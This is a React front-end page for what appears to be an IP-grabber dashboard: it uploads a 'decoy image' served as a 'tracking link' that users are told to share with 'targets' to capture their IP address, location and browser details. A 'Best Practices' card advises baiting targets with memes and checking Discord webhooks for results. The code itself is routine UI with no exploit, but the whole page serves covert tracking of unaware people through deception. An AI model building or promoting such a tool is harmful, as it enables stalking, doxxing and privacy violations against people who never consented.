import { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import Sidebar from "@/components/dashboard/sidebar";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Upload, Trash2, Image as ImageIcon, Link2, Copy, ExternalLink, AlertTriangle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { queryClient } from "@/lib/queryClient";
import { ArrowLeft } from "lucide-react";
import { useLocation } from "wouter";

interface SettingsData {
  webhookUrl: string | null;
  uploadedImageName: string | null;
  hasUploadedImage: boolean;
}

export default function ImageConfig() {
  const { toast } = useToast();
  const [dragOver, setDragOver] = useState(false);
  const [location, setLocation] = useLocation();

  const { data: settings, isLoading } = useQuery<SettingsData>({
    queryKey: ['/api/settings'],
  });

  const uploadMutation = useMutation({
    mutationFn: async (file: File) => {
      const formData = new FormData();
      formData.append('image', file);

      const token = localStorage.getItem('token');
      if (!token) {
        throw new Error('No authentication token found');
      }
      
      const response = await fetch('/api/upload-image', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`
        },
        body: formData,
      });
      if (!response.ok) throw new Error('Failed to upload image');
      return response.json();
    },
    onSuccess: (data) => {
      toast({ 
        title: "Image Uploaded Successfully!", 
        description: `${data.filename} is now active. Your tracking link is ready to use.`,
        duration: 5000,
      });
      queryClient.invalidateQueries({ queryKey: ['/api/settings'] });
    },
    onError: () => {
      toast({ title: "Error", description: "Failed to upload image.", variant: "destructive" });
    }
  });

  const deleteMutation = useMutation({
    mutationFn: async () => {
      const token = localStorage.getItem('token');
      const response = await fetch('/api/upload-image', { 
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      if (!response.ok) throw new Error('Failed to delete image');
      return response.json();
    },
    onSuccess: () => {
      toast({ title: "Image Deleted", description: "The uploaded image has been removed." });
      queryClient.invalidateQueries({ queryKey: ['/api/settings'] });
    },
    onError: () => {
      toast({ title: "Error", description: "Failed to delete image.", variant: "destructive" });
    }
  });

  const handleFileUpload = (file: File) => {
    if (!file.type.startsWith('image/')) {
      toast({ title: "Invalid File", description: "Please select an image file.", variant: "destructive" });
      return;
    }
    uploadMutation.mutate(file);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragOver(false);
    const files = Array.from(e.dataTransfer.files);
    if (files.length > 0) {
      handleFileUpload(files[0]);
    }
  };

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = Array.from(e.target.files || []);
    if (files.length > 0) {
      handleFileUpload(files[0]);
    }
  };

  const copyTrackingUrl = () => {
    const url = `${window.location.origin}/image.jpg`;
    navigator.clipboard.writeText(url);
    toast({ title: "Copied!", description: "Tracking URL copied to clipboard" });
  };

  const openTrackingUrl = () => {
    window.open(`${window.location.origin}/image.jpg`, '_blank');
  };

  if (isLoading) {
    return (
      <div className="flex h-screen bg-background">
        <Sidebar />
        <main className="flex-1 p-6">
          <div className="animate-pulse space-y-6">
            <div className="h-8 bg-muted rounded w-48"></div>
            <div className="h-32 bg-muted rounded"></div>
            <div className="h-32 bg-muted rounded"></div>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-background">
      <Sidebar />

      <main className="flex-1 overflow-auto">
        {/* Header */}
        <header className="bg-card border-b border-border px-4 sm:px-6 py-4">
          <div className="flex flex-col space-y-3 sm:flex-row sm:items-center sm:space-y-0 sm:space-x-3">
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setLocation("/dashboard")}
              className="self-start sm:mr-2"
            >
              <ArrowLeft className="h-4 w-4 mr-1" />
              Back
            </Button>
            <div className="flex items-center space-x-3">
              <div className="w-8 h-8 bg-primary/10 rounded-lg flex items-center justify-center">
                <ImageIcon className="h-4 w-4 text-primary" />
              </div>
              <div>
                <h2 className="text-xl sm:text-2xl font-semibold text-foreground">Image Configuration</h2>
                <p className="text-sm sm:text-base text-muted-foreground">Upload custom images and generate tracking links</p>
              </div>
            </div>
          </div>
        </header>

        <div className="p-4 sm:p-6 space-y-4 sm:space-y-6">
          {/* Current Image Status */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <ImageIcon className="h-5 w-5" />
                <span>Current Decoy Image</span>
              </CardTitle>
              <CardDescription>
                The image that visitors will see when they access your tracking link
              </CardDescription>
            </CardHeader>
            <CardContent>
              {settings?.hasUploadedImage ? (
                <div className="space-y-4">
                  <div className="flex flex-col space-y-3 sm:flex-row sm:items-center sm:justify-between sm:space-y-0 p-4 bg-green-500/10 border border-green-500/20 rounded-lg">
                    <div className="flex items-center space-x-3">
                      <div className="w-10 h-10 bg-green-500/20 rounded-lg flex items-center justify-center">
                        <ImageIcon className="h-5 w-5 text-green-500" />
                      </div>
                      <div>
                        <p className="font-medium text-foreground">Custom Image Active</p>
                        <p className="text-sm text-muted-foreground">{settings.uploadedImageName}</p>
                      </div>
                    </div>
                    <Button
                      variant="destructive"
                      size="sm"
                      onClick={() => deleteMutation.mutate()}
                      disabled={deleteMutation.isPending}
                      data-testid="button-delete-image"
                      className="self-start sm:self-auto"
                    >
                      <Trash2 className="h-4 w-4 mr-2" />
                      {deleteMutation.isPending ? "Deleting..." : "Delete"}
                    </Button>
                  </div>

                  {/* Image Preview */}
                  <div className="p-4 bg-muted/20 border border-border rounded-lg">
                    <div className="flex flex-col space-y-3 sm:flex-row sm:items-center sm:justify-between sm:space-y-0 mb-3">
                      <p className="font-medium text-foreground">Live Preview</p>
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={openTrackingUrl}
                        data-testid="button-preview-image"
                        className="self-start sm:self-auto"
                      >
                        <ExternalLink className="h-4 w-4 mr-2" />
                        View Image
                      </Button>
                    </div>
                    <div className="w-full max-w-md mx-auto p-4 bg-white rounded-lg border">
                      <img 
                        src={`${window.location.origin}/image.jpg`} 
                        alt="Current tracking image"
                        className="w-full h-auto rounded"
                        onError={(e) => {
                          (e.target as HTMLImageElement).style.display = 'none';
                        }}
                      />
                    </div>
                  </div>
                </div>
              ) : (
                <div className="flex items-center space-x-3 p-4 bg-muted/50 border border-border rounded-lg">
                  <AlertTriangle className="h-5 w-5 text-yellow-500" />
                  <div>
                    <p className="font-medium text-foreground">Using Default Pixel</p>
                    <p className="text-sm text-muted-foreground">1x1 transparent GIF will be served to visitors</p>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>

          {/* Tracking Link Generator */}
          {settings?.hasUploadedImage && (
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <Link2 className="h-5 w-5" />
                  <span>Generated Tracking Link</span>
                </CardTitle>
                <CardDescription>
                  Share this link with targets to track their IP addresses
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="p-4 bg-blue-500/10 border border-blue-500/20 rounded-lg">
                  <div className="space-y-4">
                    <div>
                      <p className="font-medium text-foreground mb-2">🎯 Your Tracking URL</p>
                      <p className="text-sm text-muted-foreground mb-3">
                        When someone clicks this link, they'll see your uploaded image and you'll capture their IP address, location, and browser information.
                      </p>
                    </div>

                    <div className="flex items-center space-x-2">
                      <code className="bg-muted px-3 py-2 rounded text-sm font-mono text-foreground flex-1 select-all border">
                        {window.location.origin}/image.jpg
                      </code>
                      <Button
                        size="sm"
                        onClick={copyTrackingUrl}
                        data-testid="button-copy-url"
                      >
                        <Copy className="h-4 w-4 mr-2" />
                        Copy
                      </Button>
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={openTrackingUrl}
                        data-testid="button-test-url"
                      >
                        <ExternalLink className="h-4 w-4 mr-2" />
                        Test
                      </Button>
                    </div>

                    <div className="text-xs text-blue-600 dark:text-blue-400">
                      💡 Tip: Test the link yourself first to make sure it works correctly
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

          {/* Image Upload */}
          <Card>
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <Upload className="h-5 w-5" />
                <span>Upload New Image</span>
              </CardTitle>
              <CardDescription>
                Upload a custom image to replace the current decoy image
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* Upload Area */}
              <div
                className={`border-2 border-dashed rounded-lg p-8 text-center transition-colors ${
                  dragOver 
                    ? 'border-primary bg-primary/5' 
                    : 'border-muted-foreground/25 hover:border-muted-foreground/50'
                }`}
                onDrop={handleDrop}
                onDragOver={(e) => {
                  e.preventDefault();
                  setDragOver(true);
                }}
                onDragLeave={() => setDragOver(false)}
              >
                <Upload className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
                <h3 className="text-lg font-medium text-foreground mb-2">Upload Custom Image</h3>
                <p className="text-muted-foreground mb-4">
                  Drag and drop an image here, or click to select
                </p>
                <input
                  type="file"
                  accept="image/*"
                  onChange={handleFileSelect}
                  className="hidden"
                  id="image-upload"
                  data-testid="input-image-upload"
                />
                <Button 
                  asChild 
                  variant="outline"
                  disabled={uploadMutation.isPending}
                >
                  <label htmlFor="image-upload" className="cursor-pointer">
                    {uploadMutation.isPending ? "Uploading..." : "Select Image"}
                  </label>
                </Button>
                <p className="text-xs text-muted-foreground mt-2">
                  No file size limit • Supported: JPG, PNG, GIF, WebP
                </p>
              </div>
            </CardContent>
          </Card>

          {/* Usage Tips */}
          <Card>
            <CardHeader>
              <CardTitle>Best Practices</CardTitle>
              <CardDescription>
                Tips for effective IP logging campaigns
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-3">
              <div className="flex items-start space-x-3">
                <div className="w-6 h-6 bg-primary/10 rounded-full flex items-center justify-center mt-0.5">
                  <span className="text-xs font-medium text-primary">1</span>
                </div>
                <div>
                  <p className="font-medium text-foreground">Choose Compelling Images</p>
                  <p className="text-sm text-muted-foreground">
                    Use images that your targets are likely to click on (memes, interesting photos, etc.)
                  </p>
                </div>
              </div>

              <div className="flex items-start space-x-3">
                <div className="w-6 h-6 bg-primary/10 rounded-full flex items-center justify-center mt-0.5">
                  <span className="text-xs font-medium text-primary">2</span>
                </div>
                <div>
                  <p className="font-medium text-foreground">Test Before Sending</p>
                  <p className="text-sm text-muted-foreground">
                    Always test your tracking link to ensure it loads properly
                  </p>
                </div>
              </div>

              <div className="flex items-start space-x-3">
                <div className="w-6 h-6 bg-primary/10 rounded-full flex items-center justify-center mt-0.5">
                  <span className="text-xs font-medium text-primary">3</span>
                </div>
                <div>
                  <p className="font-medium text-foreground">Monitor Results</p>
                  <p className="text-sm text-muted-foreground">
                    Check the Log Entries page and Discord webhooks for real-time tracking results
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  );
}